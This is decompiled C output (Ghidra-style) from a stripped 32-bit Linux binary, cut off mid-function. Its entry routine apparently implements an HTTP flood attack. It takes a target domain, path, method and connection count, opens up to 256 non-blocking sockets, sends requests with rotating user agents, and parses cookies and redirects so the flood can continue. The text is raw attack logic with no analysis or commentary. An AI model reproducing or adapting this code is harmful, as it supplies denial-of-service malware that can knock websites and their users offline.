typedef unsigned char   undefined;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned short    word;
typedef struct Elf32_Shdr Elf32_Shdr, *PElf32_Shdr;

typedef enum Elf_SectionHeaderType_x86 {
    SHT_NULL=0,
    SHT_PROGBITS=1,
    SHT_SYMTAB=2,
    SHT_STRTAB=3,
    SHT_RELA=4,
    SHT_HASH=5,
    SHT_DYNAMIC=6,
    SHT_NOTE=7,
    SHT_NOBITS=8,
    SHT_REL=9,
    SHT_SHLIB=10,
    SHT_DYNSYM=11,
    SHT_INIT_ARRAY=14,
    SHT_FINI_ARRAY=15,
    SHT_PREINIT_ARRAY=16,
    SHT_GROUP=17,
    SHT_SYMTAB_SHNDX=18,
    SHT_ANDROID_REL=1610612737,
    SHT_ANDROID_RELA=1610612738,
    SHT_GNU_ATTRIBUTES=1879048181,
    SHT_GNU_HASH=1879048182,
    SHT_GNU_LIBLIST=1879048183,
    SHT_CHECKSUM=1879048184,
    SHT_SUNW_move=1879048186,
    SHT_SUNW_COMDAT=1879048187,
    SHT_SUNW_syminfo=1879048188,
    SHT_GNU_verdef=1879048189,
    SHT_GNU_verneed=1879048190,
    SHT_GNU_versym=1879048191
} Elf_SectionHeaderType_x86;

struct Elf32_Shdr {
    dword sh_name;
    enum Elf_SectionHeaderType_x86 sh_type;
    dword sh_flags;
    dword sh_addr;
    dword sh_offset;
    dword sh_size;
    dword sh_link;
    dword sh_info;
    dword sh_addralign;
    dword sh_entsize;
};

typedef struct Elf32_Phdr Elf32_Phdr, *PElf32_Phdr;

typedef enum Elf_ProgramHeaderType_x86 {
    PT_NULL=0,
    PT_LOAD=1,
    PT_DYNAMIC=2,
    PT_INTERP=3,
    PT_NOTE=4,
    PT_SHLIB=5,
    PT_PHDR=6,
    PT_TLS=7,
    PT_GNU_EH_FRAME=1685382480,
    PT_GNU_STACK=1685382481,
    PT_GNU_RELRO=1685382482
} Elf_ProgramHeaderType_x86;

struct Elf32_Phdr {
    enum Elf_ProgramHeaderType_x86 p_type;
    dword p_offset;
    dword p_vaddr;
    dword p_paddr;
    dword p_filesz;
    dword p_memsz;
    dword p_flags;
    dword p_align;
};

typedef struct Elf32_Ehdr Elf32_Ehdr, *PElf32_Ehdr;

struct Elf32_Ehdr {
    byte e_ident_magic_num;
    char e_ident_magic_str[3];
    byte e_ident_class;
    byte e_ident_data;
    byte e_ident_version;
    byte e_ident_osabi;
    byte e_ident_abiversion;
    byte e_ident_pad[7];
    word e_type;
    word e_machine;
    dword e_version;
    dword e_entry;
    dword e_phoff;
    dword e_shoff;
    dword e_flags;
    word e_ehsize;
    word e_phentsize;
    word e_phnum;
    word e_shentsize;
    word e_shnum;
    word e_shstrndx;
};




void FUN_08048094(void)

{
  FUN_08048100();
  FUN_080561d0();
  return;
}



// WARNING: Removing unreachable block (ram,0x080480df)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_080480b0(void)

{
  code *pcVar1;
  
  if (DAT_080570a0 == '\0') {
    while (pcVar1 = *_DAT_0805706c, pcVar1 != (code *)0x0) {
      _DAT_0805706c = _DAT_0805706c + 1;
      (*pcVar1)();
    }
    DAT_080570a0 = '\x01';
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0804811b)
// WARNING: Removing unreachable block (ram,0x08048142)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_08048100(void)

{
  return;
}



void processEntry entry(undefined4 param_1,uint param_2)

{
  undefined4 *puVar1;
  undefined *puVar2;
  code *pcVar3;
  char cVar4;
  undefined2 uVar5;
  undefined2 uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  undefined4 *puVar12;
  undefined4 uVar13;
  int iVar14;
  uint uVar15;
  uint *puVar16;
  int *piVar17;
  undefined4 *puVar18;
  int *piVar19;
  int *piVar20;
  undefined4 uVar21;
  byte bVar22;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  int *piVar23;
  int *piVar24;
  char *pcVar25;
  int *piVar26;
  char *pcVar27;
  uint uVar28;
  int *piVar29;
  char *pcVar30;
  int *piVar31;
  undefined8 uVar32;
  int iStack_51b4;
  int iStack_519c;
  int iStack_5190;
  char *pcStack_518c;
  int iStack_5188;
  char cStack_517a;
  undefined4 uStack_5179;
  char acStack_5175 [10237];
  undefined auStack_2978 [10240];
  uint auStack_178 [32];
  uint auStack_f8 [32];
  undefined4 uStack_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 uStack_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  uint uStack_5c;
  int *piStack_58;
  undefined auStack_54 [16];
  undefined4 uStack_44;
  code *pcStack_40;
  uint uStack_3c;
  undefined *puStack_38;
  code *pcStack_34;
  code *pcStack_30;
  undefined4 uStack_2c;
  undefined4 uStack_14;
  
  uStack_14 = 0x804816f;
  uStack_2c = 0;
  pcStack_30 = FUN_080561f7;
  pcStack_34 = FUN_08048094;
  puStack_38 = &stack0x00000004;
  uStack_3c = param_2;
  pcStack_40 = FUN_0804e930;
  uStack_44 = 0x8048192;
  FUN_0805272e();
  pcVar3 = pcStack_30;
  uStack_44 = 0;
  uVar15 = (uint)pcStack_34 & 0xff;
  uVar28 = uStack_3c & 0xff;
  iVar7 = FUN_08049ef0(uVar15,pcStack_30,0x15,0);
  iVar8 = FUN_08049ef0(uVar15,pcVar3,0x14,&DAT_08056254);
  iVar9 = FUN_08049ef0(uVar15,pcVar3,8,0);
  iVar10 = FUN_08049ef0(uVar15,pcVar3,0x16,&DAT_0805622d);
  iStack_5188 = FUN_0804a410(uVar15,pcVar3,0x18,1);
  uVar5 = FUN_0804a410(uVar15,pcVar3,7,0x50);
  FUN_0805492c(&cStack_517a + 1,0,0x2801);
  if ((((iVar9 == 0) || (iVar10 == 0)) || (iVar11 = FUN_08052190(iVar10), 0xff < iVar11)) ||
     ((iVar11 = FUN_08052190(iVar9), 0x7f < iVar11 || (iVar11 = FUN_08052190(iVar8), 9 < iVar11))))
  {
    return;
  }
  piStack_58 = (int *)0x0;
  while (iVar11 = FUN_08052190(iVar8), (int)piStack_58 < iVar11) {
    cVar4 = *(char *)(iVar8 + (int)piStack_58);
    if ((byte)(cVar4 + 0x9fU) < 0x1a) {
      *(char *)(iVar8 + (int)piStack_58) = cVar4 + -0x20;
    }
    piStack_58 = (int *)((int)piStack_58 + 1);
  }
  if (0x100 < iStack_5188) {
    iStack_5188 = 0x100;
  }
  FUN_08051840(0x24);
  FUN_08051840(0x25);
  FUN_08051840(0x26);
  FUN_08051840(0x27);
  FUN_08051840(0x28);
  FUN_08051840(0x29);
  FUN_08051840(0x2a);
  FUN_08051840(0x2b);
  FUN_08051840(0x2c);
  FUN_08051840(0x2d);
  FUN_08051840(0x2e);
  puVar12 = (undefined4 *)FUN_08052be0(iStack_5188,0xc44);
  if (0 < iStack_5188) {
    iStack_51b4 = 0;
    uVar13 = extraout_ECX;
    puVar18 = puVar12;
    do {
      puVar2 = puStack_38;
      *(undefined *)(puVar18 + 1) = 0;
      *puVar18 = 0xffffffff;
      iVar11 = iStack_51b4 % (int)uVar28;
      puVar1 = puVar18 + 0x85;
      puVar18[4] = *(undefined4 *)(puStack_38 + iVar11 * 0x18 + 0x10);
      uVar13 = FUN_080521b0(puVar1,iVar10,uVar13,uVar13);
      if (*(char *)(puVar18 + 0x85) != '/') {
        uVar13 = FUN_08052190(puVar1);
        uVar13 = FUN_080548f8((int)puVar18 + 0x215,puVar1,uVar13);
        *(undefined *)(puVar18 + 0x85) = 0x2f;
      }
      FUN_080521b0(puVar18 + 0x168,iVar8,uVar13,uVar13);
      FUN_080521b0((int)puVar18 + 0x597,iVar8);
      FUN_080521b0((int)puVar18 + 0x315,iVar9);
      if ((byte)puVar2[iVar11 * 0x18 + 0x14] < 0x20) {
        iVar14 = FUN_08054228(*(undefined4 *)(puVar2 + iVar11 * 0x18 + 0x10));
        uVar15 = FUN_0804f4a0();
        uVar13 = FUN_08054088((uVar15 >> (puVar2[iVar11 * 0x18 + 0x14] & 0x1f)) + iVar14);
        puVar18[4] = uVar13;
      }
      uVar15 = FUN_0804f4a0();
      uVar15 = uVar15 % 5;
      switch(uVar15) {
      case 0:
        FUN_08051840(0x2f);
        uVar13 = FUN_08051790(0x2f,0);
        FUN_080521b0(puVar18 + 5,uVar13);
        uVar15 = FUN_080517c0(0x2f);
        break;
      case 1:
        FUN_08051840(0x30);
        uVar13 = FUN_08051790(0x30,0);
        FUN_080521b0(puVar18 + 5,uVar13);
        uVar15 = FUN_080517c0(0x30);
        break;
      case 2:
        FUN_08051840(0x31);
        uVar13 = FUN_08051790(0x31,0);
        FUN_080521b0(puVar18 + 5,uVar13);
        uVar15 = FUN_080517c0(0x31);
        break;
      case 3:
        FUN_08051840(0x32);
        uVar13 = FUN_08051790(0x32,0);
        FUN_080521b0(puVar18 + 5,uVar13);
        uVar15 = FUN_080517c0(0x32);
        break;
      case 4:
        FUN_08051840(0x33);
        uVar13 = FUN_08051790(0x33,0);
        FUN_080521b0(puVar18 + 5,uVar13);
        uVar15 = FUN_080517c0(0x33);
      }
      puVar18 = puVar18 + 0x311;
      FUN_080521b0(puVar1,iVar10,uVar15,uVar15);
      iStack_51b4 = iStack_51b4 + 1;
      uVar13 = extraout_ECX_00;
    } while (iStack_51b4 != iStack_5188);
  }
LAB_08048564:
  do {
    do {
      do {
        iVar8 = FUN_08054c4c(0);
        puVar16 = auStack_f8;
        do {
          *puVar16 = 0;
          puVar16 = puVar16 + 1;
        } while (puVar16 != &uStack_78);
        puVar16 = auStack_178;
        do {
          *puVar16 = 0;
          puVar16 = puVar16 + 1;
        } while (puVar16 != auStack_f8);
      } while (iStack_5188 < 1);
      iStack_519c = 0;
      uVar15 = extraout_ECX_01;
      iVar9 = 0;
      puVar18 = puVar12 + 4;
      do {
        while (iVar10 = iVar9, cVar4 = *(char *)(puVar18 + -3), cVar4 != '\x01') {
          if (cVar4 == '\0') goto LAB_08048623;
          if (cVar4 == '\x02') {
            if ((uint)(iVar8 - puVar18[-2]) < 0x1f) {
              uVar28 = puVar18[-4];
              uVar15 = uVar28 & 0x1f;
              auStack_178[uVar28 >> 5] = auStack_178[uVar28 >> 5] | 1 << (sbyte)uVar15;
              goto joined_r0x08048ebc;
            }
          }
          else {
            if (cVar4 == '\x04') goto LAB_080488aa;
            if (((cVar4 == '\x06') || (cVar4 == '\a')) || (cVar4 == '\n')) {
              uVar28 = puVar18[-4];
              uVar15 = auStack_f8[uVar28 >> 5] | 1 << ((byte)uVar28 & 0x1f);
              auStack_f8[uVar28 >> 5] = uVar15;
              goto joined_r0x08048e77;
            }
          }
          *(undefined *)(puVar18 + -3) = 0;
          FUN_08054c95(puVar18[-4]);
          puVar18[-4] = 0xffffffff;
          uVar15 = extraout_ECX_02;
LAB_08048600:
          puVar18 = puVar18 + 0x311;
          iVar9 = iVar10 + 1;
          if (iVar10 + 1 == iStack_5188) goto LAB_0804874e;
        }
        if (puVar18[0x168] == 0) {
          *(undefined *)(puVar18 + -3) = 0;
LAB_08048623:
          uStack_78 = 0;
          uStack_74 = 0;
          uStack_70 = 0;
          uStack_6c = 0;
          if (puVar18[-4] != -1) {
            FUN_08054c95(puVar18[-4]);
            uVar15 = extraout_ECX_03;
          }
          uVar32 = FUN_080543a4(2,1,0,uVar15);
          iVar9 = (int)uVar32;
          puVar18[-4] = iVar9;
          uVar15 = extraout_ECX_04;
          if (iVar9 != -1) {
            uVar15 = FUN_080528f0(iVar9,3,0,(int)((ulonglong)uVar32 >> 0x20));
            FUN_080528f0(puVar18[-4],4,uVar15 | 0x800);
            piStack_58 = (int *)0xffff;
            FUN_08054350(puVar18[-4],0,8,&piStack_58,4);
            uStack_74 = *puVar18;
            uStack_78 = CONCAT22(uStack_78._2_2_,2);
            uVar6 = FUN_080540b4(uVar5);
            uStack_78 = CONCAT22(uVar6,(undefined2)uStack_78);
            puVar18[-2] = iVar8;
            *(undefined *)(puVar18 + -3) = 2;
            FUN_08053f88(puVar18[-4],&uStack_78,0x10);
            uVar28 = puVar18[-4];
            uVar15 = auStack_178[uVar28 >> 5] | 1 << ((byte)uVar28 & 0x1f);
            auStack_178[uVar28 >> 5] = uVar15;
joined_r0x08048ebc:
            if (iStack_519c < (int)uVar28) goto LAB_08048738;
          }
          goto LAB_08048600;
        }
        *(undefined *)(puVar18 + -3) = 4;
LAB_080488aa:
        puVar18[0x16a] = 0xffffffff;
        puVar18[0x167] = 0;
        FUN_08052220(puVar18 + 0x20d,0x400,uVar15,uVar15);
        puVar18[0x20c] = 0;
        FUN_08052220(auStack_2978,0x2800);
        iVar9 = (int)puVar18 + 0x587;
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,iVar9);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_0805625f);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,puVar18 + 0x81);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11," HTTP/1.1\r\nUser-Agent: ");
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,puVar18 + 1);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,"\r\nHost: ");
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,(int)puVar18 + 0x305);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        FUN_08051840(0x20);
        uVar13 = FUN_08051790(0x20,0);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,uVar13);
        FUN_080517c0(0x20);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        FUN_08051840(0x21);
        uVar13 = FUN_08051790(0x21,0);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,uVar13);
        FUN_080517c0(0x21);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        FUN_08051840(0x22);
        uVar13 = FUN_08051790(0x22,0);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,uVar13);
        FUN_080517c0(0x22);
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        if (iVar7 != 0) {
          FUN_08051840(0x23);
          uVar13 = FUN_08051790(0x23,0);
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,uVar13);
          FUN_080517c0(0x23);
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
          uVar13 = FUN_08051790(0x28,0);
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,uVar13);
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,&DAT_0805625f);
          iVar11 = FUN_08052190(auStack_2978);
          uVar13 = FUN_08052190(iVar7);
          FUN_08052590(uVar13,10,auStack_2978 + iVar11);
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        }
        if (0 < (int)puVar18[0x16b]) {
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,&DAT_08056258);
          piStack_58 = (int *)0x0;
          if (0 < (int)puVar18[0x16b]) {
            do {
              piVar29 = piStack_58;
              iVar11 = FUN_08052190(auStack_2978);
              FUN_080521b0(auStack_2978 + iVar11,puVar18 + (int)piVar29 * 0x20 + 0x16c);
              iVar11 = FUN_08052190(auStack_2978);
              FUN_080521b0(auStack_2978 + iVar11,&DAT_08056261);
              piStack_58 = (int *)((int)piStack_58 + 1);
            } while ((int)piStack_58 < (int)puVar18[0x16b]);
          }
          iVar11 = FUN_08052190(auStack_2978);
          FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        }
        iVar11 = FUN_08052190(auStack_2978);
        FUN_080521b0(auStack_2978 + iVar11,&DAT_08056266);
        iVar11 = iVar7;
        if (iVar7 != 0) {
          iVar11 = FUN_08052190(auStack_2978);
          iVar11 = FUN_080521b0(auStack_2978 + iVar11,iVar7);
        }
        uVar13 = FUN_080524f0(iVar9,puVar18 + 0x164,iVar11,iVar11);
        if ((char)uVar13 == '\0') {
          FUN_080521b0(iVar9,puVar18 + 0x164,uVar13,uVar13);
        }
        uVar13 = FUN_08052190(auStack_2978);
        FUN_080542d8(puVar18[-4],auStack_2978,uVar13,0x4000);
        uVar28 = puVar18[-4];
        *(undefined *)(puVar18 + -3) = 6;
        uVar15 = uVar28 & 0x1f;
        puVar18[-1] = iVar8;
        auStack_f8[uVar28 >> 5] = auStack_f8[uVar28 >> 5] | 1 << (sbyte)uVar15;
joined_r0x08048e77:
        if ((int)uVar28 <= iStack_519c) goto LAB_08048600;
LAB_08048738:
        iStack_519c = uVar28 + 1;
        puVar18 = puVar18 + 0x311;
        iVar9 = iVar10 + 1;
      } while (iVar10 + 1 != iStack_5188);
LAB_0804874e:
      piVar29 = (int *)(iVar10 + 1);
    } while (iStack_519c == 0);
    uStack_64 = 0;
    uStack_68 = 1;
    iVar8 = FUN_08054550(iStack_519c,auStack_f8,auStack_178,0,&uStack_68);
    piVar17 = (int *)FUN_08054c4c(0);
  } while (iVar8 < 1);
  iStack_5190 = 0;
  piVar31 = puVar12 + 0x16b;
LAB_0804880d:
  piVar19 = piVar31 + -0x16b;
  uVar15 = piVar31[-0x16b];
  if (uVar15 != 0xffffffff) {
    uVar28 = uVar15 >> 5;
    bVar22 = (byte)uVar15 & 0x1f;
    if ((auStack_178[uVar28] >> bVar22 & 1) != 0) {
      uStack_5c = 0;
      uStack_60 = 4;
      uVar15 = FUN_08054034(uVar15,1,4,&uStack_5c,&uStack_60);
      if ((uVar15 | uStack_5c) == 0) {
        *(undefined *)(piVar31 + -0x16a) = 4;
        uVar28 = (uint)piVar31[-0x16b] >> 5;
        bVar22 = (byte)piVar31[-0x16b] & 0x1f;
        goto LAB_080487c0;
      }
LAB_08048f58:
      FUN_08054c95(piVar31[-0x16b]);
      piVar31[-0x16b] = -1;
      *(undefined *)(piVar31 + -0x16a) = 0;
      goto LAB_080487f0;
    }
LAB_080487c0:
    if ((auStack_f8[uVar28] >> bVar22 & 1) == 0) goto LAB_080487f0;
    cVar4 = *(char *)(piVar31 + -0x16a);
    if (cVar4 == '\x06') {
      FUN_08052220(&cStack_517a + 1,0x2800,piVar29,piVar29);
      piVar19 = (int *)FUN_08054260(piVar31[-0x16b],&cStack_517a + 1,0x2800,0x4002);
      if ((int)piVar19 < 1) goto LAB_08048f58;
      iVar8 = FUN_08052240(&cStack_517a + 1,piVar19,&DAT_08056264,4);
      if ((iVar8 != -1) || (0x27ff < (int)piVar19)) {
        iVar8 = FUN_08052240(&cStack_517a + 1,piVar19,&DAT_08056264,4);
        (&cStack_517a)[iVar8 + 1] = '\0';
        uVar13 = FUN_08051790(0x2e,0);
        iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 != -1) {
          *piVar31 = 2;
        }
        uVar13 = FUN_08051790(0x2d,0,piVar29,piVar29);
        iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 != -1) {
          *piVar31 = 1;
        }
        piVar31[1] = 0;
        uVar13 = FUN_08051790(0x2c,0,piVar19,piVar19);
        uVar32 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
        uVar13 = (undefined4)((ulonglong)uVar32 >> 0x20);
        iVar8 = (int)uVar32 + 1;
        piVar24 = piVar19;
        if (iVar8 != 0) {
          uVar13 = FUN_08051790(0x2c,0,uVar13,uVar13);
          iVar9 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
          iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
          piVar24 = (int *)(&cStack_517a + iVar9 + 1);
          iVar8 = FUN_08052240(piVar24,(int)piVar19 - iVar9,&DAT_08056266,2);
          if (iVar8 != -1) {
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            puVar2 = auStack_54 + iVar8;
            puVar2[iVar9 + -0x5125] = 0;
            uVar13 = FUN_08051790(0x2b,0,puVar2,puVar2);
            uVar21 = FUN_08052190(piVar24);
            iVar8 = FUN_08052470(piVar24,uVar21,uVar13);
            if (iVar8 != 0) {
              piVar31[1] = 1;
            }
          }
        }
        piVar31[2] = 0;
        uVar13 = FUN_08051790(0x29,0,iVar8,iVar8);
        iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
        iVar8 = iVar8 + 1;
        if (iVar8 != 0) {
          uVar13 = FUN_08051790(0x29,0,iVar8,iVar8);
          iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
          iVar8 = iVar8 + (uint)((&cStack_517a)[iVar8 + 1] == ' ');
          piVar24 = (int *)(&cStack_517a + iVar8 + 1);
          iVar9 = FUN_08052240(piVar24,(int)piVar19 - iVar8,&DAT_08056266,2);
          if (iVar9 != -1) {
            if (1 < iVar9) {
              iVar9 = iVar9 + -2;
            }
            (&cStack_517a)[iVar8 + iVar9 + 1] = '\0';
            uVar13 = FUN_08051790(0x2a,0,piVar29,piVar29);
            uVar21 = FUN_08052190(piVar24);
            iVar8 = FUN_08052470(piVar24,uVar21,uVar13);
            if (iVar8 != 0) {
              piVar31[2] = 1;
            }
          }
        }
        uVar13 = FUN_08051790(0x28,0,piVar24,piVar24);
        iVar8 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
        if (iVar8 == -1) {
          piVar31[3] = 0;
          iVar8 = 0;
        }
        else {
          uVar13 = FUN_08051790(0x28,0,extraout_ECX_07,extraout_ECX_07);
          iVar9 = FUN_08052470(&cStack_517a + 1,piVar19,uVar13);
          iVar9 = iVar9 + (uint)((&cStack_517a)[iVar9 + 1] == ' ');
          iVar8 = FUN_08052240(&cStack_517a + iVar9 + 1,(int)piVar19 - iVar9,&DAT_08056266,2);
          if (iVar8 != -1) {
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            puVar2 = auStack_54 + iVar8;
            puVar2[iVar9 + -0x5125] = 0;
            iVar8 = FUN_08052290(&cStack_517a + iVar9 + 1,10,puVar2,puVar2);
            piVar31[3] = iVar8;
          }
        }
        pcVar25 = (char *)0x0;
LAB_08049494:
        do {
          uVar13 = FUN_08051790(0x27,0,iVar8,iVar8);
          pcVar27 = &cStack_517a + 1 + (int)pcVar25;
          iVar8 = FUN_08052470(pcVar27,piVar19,uVar13);
          iVar8 = iVar8 + 1;
          if ((iVar8 == 0) || (4 < piVar31[4])) goto LAB_08049659;
          uVar13 = FUN_08051790(0x27,0,iVar8,iVar8);
          iVar8 = FUN_08052470(pcVar27,piVar19,uVar13);
          pcStack_518c = pcVar25 + iVar8;
          if ((&cStack_517a + 1)[(int)pcStack_518c] == ' ') {
            iVar8 = iVar8 + 1;
            pcStack_518c = pcVar25 + iVar8;
          }
          pcVar27 = pcVar27 + iVar8;
          piVar29 = (int *)((int)piVar19 + (-iVar8 - (int)pcVar25));
          iVar8 = FUN_08052240(pcVar27,piVar29,&DAT_08056266,2);
          pcVar25 = pcStack_518c;
          if (iVar8 != -1) {
            pcVar30 = &cStack_517a + 1 + (int)pcStack_518c;
            if (1 < iVar8) {
              iVar8 = iVar8 + -2;
            }
            iVar9 = FUN_08052240(pcVar27,piVar29,&DAT_08056269,1);
            if (0 < iVar9) {
              iVar8 = FUN_08052240(pcVar27,piVar29,&DAT_08056269,1);
              iVar8 = iVar8 + -1;
            }
            piStack_58 = (int *)0x0;
            (&cStack_517a + 1 + (int)pcStack_518c)[iVar8] = '\0';
            while (iVar8 = FUN_08052190(pcVar30), piVar24 = piStack_58, (int)piStack_58 < iVar8) {
              if (pcVar30[(int)piStack_58] == '=') goto LAB_080495c6;
              piStack_58 = (int *)((int)piStack_58 + 1);
            }
            if (pcVar30[(int)piStack_58] == '=') {
LAB_080495c6:
              piStack_58 = (int *)0x0;
              if (0 < piVar31[4]) {
                do {
                  iVar8 = FUN_08052540(pcVar30,piVar31 + (int)piStack_58 * 0x20 + 5,piVar24,piVar29)
                  ;
                  if ((char)iVar8 != '\0') goto LAB_08049494;
                  piStack_58 = (int *)((int)piStack_58 + 1);
                } while ((int)piStack_58 < piVar31[4]);
              }
              iVar8 = FUN_08052190(pcVar30);
              if (iVar8 < 0x80) {
                iVar8 = FUN_080521b0(piVar31 + piVar31[4] * 0x20 + 5,pcVar30,extraout_ECX_08,
                                     extraout_ECX_08);
                piVar31[4] = piVar31[4] + 1;
              }
            }
          }
        } while( true );
      }
      goto LAB_080487f0;
    }
    if (cVar4 == '\a') {
      piVar29 = piVar31 + 0xb6;
      piVar24 = piVar31 + 0xa6;
      iVar8 = piVar31[0xa5];
      piVar20 = piVar19;
      while( true ) {
        if (iVar8 == 0x400) {
          FUN_080548f8(piVar24,piVar29,0x3c0,piVar20);
          piVar31[0xa5] = piVar31[0xa5] + -0x40;
        }
        puVar18 = (undefined4 *)FUN_080528b0();
        *puVar18 = 0;
        iVar8 = FUN_08054260(piVar31[-0x16b],(int)piVar24 + piVar31[0xa5],0x400 - piVar31[0xa5],
                             0x4000);
        if (iVar8 == 0) break;
        if (iVar8 == -1) goto LAB_08048f3c;
        piVar31[0xa5] = piVar31[0xa5] + iVar8;
        piVar31[-0x169] = (int)piVar17;
        piVar23 = piVar17;
        do {
          piVar20 = (int *)piVar31[3];
          if ((int)piVar20 < 1) {
            piVar26 = (int *)0x0;
          }
          else {
            piVar26 = (int *)piVar31[0xa5];
            if ((int)piVar20 < (int)(int *)piVar31[0xa5]) {
              piVar26 = piVar20;
            }
            piVar20 = (int *)((int)piVar20 - (int)piVar26);
            piVar31[3] = (int)piVar20;
            if (*piVar31 == 1) {
              uVar13 = FUN_08051790(0x24,0,piVar20,piVar20);
              uVar32 = FUN_08052240(piVar24,piVar31[0xa5],uVar13,0xb);
              piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
              if ((int)uVar32 != -1) {
                uVar13 = FUN_08051790(0x24,0,piVar29,piVar29);
                iVar8 = FUN_08052240(piVar24,piVar31[0xa5],uVar13,0xb);
                piVar29 = (int *)((int)piVar24 + iVar8);
                iVar9 = FUN_08052240(piVar29,piVar31[0xa5] - iVar8,&DAT_0805627a,1);
                *(undefined *)((int)piVar31 + iVar9 + iVar8 + 0x297) = 0;
                if ((piVar31[4] < 5) && (iVar10 = FUN_08052190(piVar29), iVar10 < 0x80)) {
                  FUN_080521b0(piVar31 + piVar31[4] * 0x20 + 5,piVar29,extraout_ECX_10,
                               extraout_ECX_10);
                  iVar10 = piVar31[4];
                  piVar29 = piVar31 + iVar10 * 0x20 + 5;
                  iVar11 = FUN_08052190();
                  FUN_080521b0((int)(piVar31 + iVar10 * 0x20 + 5) + iVar11,&DAT_08056273);
                  iVar10 = iVar9 + iVar8 + 3;
                  iVar8 = FUN_08052240((int)piVar24 + iVar10,piVar31[0xa5] - iVar10,&DAT_0805627a,1)
                  ;
                  *(undefined *)((int)piVar31 + iVar10 + iVar8 + 0x297) = 0;
                  iVar8 = piVar31[4];
                  iVar9 = FUN_08052190(piVar31 + iVar8 * 0x20 + 5);
                  FUN_080521b0((int)(piVar31 + iVar8 * 0x20 + 5) + iVar9,(int)piVar24 + iVar10);
                  piVar31[4] = piVar31[4] + 1;
                }
                piVar31[3] = -1;
                *(undefined *)(piVar31 + -0x16a) = 10;
                goto LAB_080487f0;
              }
              piVar20 = (int *)piVar31[3];
            }
          }
          if (piVar20 == (int *)0x0) {
            if (piVar31[2] == 1) {
              uVar32 = FUN_08052240(piVar24,piVar31[0xa5],&DAT_08056266,2);
              piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
              piVar20 = (int *)((int)uVar32 + 1);
              if (piVar20 != (int *)0x0) {
                piVar26 = (int *)FUN_08052240(piVar24,piVar31[0xa5],&DAT_08056266,2);
                *(undefined *)((int)piVar26 + 0x842 + (int)piVar19) = 0;
                iVar8 = FUN_08052240(piVar24,piVar26,&DAT_08056269,1);
                uVar13 = extraout_ECX_05;
                if (iVar8 != -1) {
                  iVar8 = FUN_08052240(piVar24,piVar26,&DAT_08056269,1);
                  *(undefined *)((int)piVar31 + iVar8 + 0x298) = 0;
                  uVar13 = extraout_ECX_06;
                }
                uVar32 = FUN_08052290(piVar24,0x10,uVar13,uVar13);
                piVar23 = (int *)((ulonglong)uVar32 >> 0x20);
                if ((int)uVar32 == 0) goto LAB_08048f25;
                piVar20 = (int *)((int)uVar32 + 2);
                piVar31[3] = (int)piVar20;
              }
            }
            else {
              piVar20 = (int *)(piVar31[0xa5] - (int)piVar26);
              piVar31[3] = (int)piVar20;
              if (piVar20 == (int *)0x0) goto LAB_08048f25;
            }
          }
          if (piVar26 == (int *)0x0) break;
          iVar8 = piVar31[0xa5];
          piVar31[0xa5] = iVar8 - (int)piVar26;
          FUN_080548f8(piVar24,(int)piVar24 + (int)piVar26,iVar8 - (int)piVar26,piVar23);
          piVar20 = (int *)piVar31[0xa5];
